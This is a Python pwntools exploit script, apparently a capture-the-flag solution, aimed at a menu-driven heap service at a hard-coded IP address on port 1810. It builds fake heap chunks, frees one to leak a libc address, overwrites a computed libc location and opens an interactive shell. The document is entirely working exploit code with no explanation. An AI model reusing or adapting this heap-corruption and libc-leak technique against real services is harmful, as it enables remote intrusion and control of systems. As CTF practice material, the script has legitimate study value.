from pwn import *

HOST = ""
PORT = 1810
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
maping = 0x13370000
def write_heap(n, offset, dat):
  s.recvuntil("[4] : exit")
  s.sendline("1")
  s.recvuntil("?")
  s.sendline(str(n))
  s.recvuntil("?")
  s.sendline(str(offset))
  time.sleep(0.5)
  s.send(dat)

def free_heap(offset):
  s.recvuntil("[4] : exit")
  s.sendline("2")
  s.recvuntil("?")
  s.sendline(str(offset))

def leak(offset):
  s.recvuntil("[4] : exit")
  s.sendline("3")
  s.recvuntil("?")
  s.sendline(str(offset))

s.recvuntil("?")
s.sendline(str(maping))
write_heap(0x100+0x20,0x0,p64(0)+p64(0xf1)+"A"*0xe0+p64(0)+p64(0x21)+"A"*0x10+p64(0)+p64(0x21))
free_heap(16)
leak(16)
libc = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x3c4b78
print hex(libc)
raw_input()
write_heap(maping+0x1000000, ((libc+0x00000000003C45F8)-maping),"ABCD\n")
s.interactive()

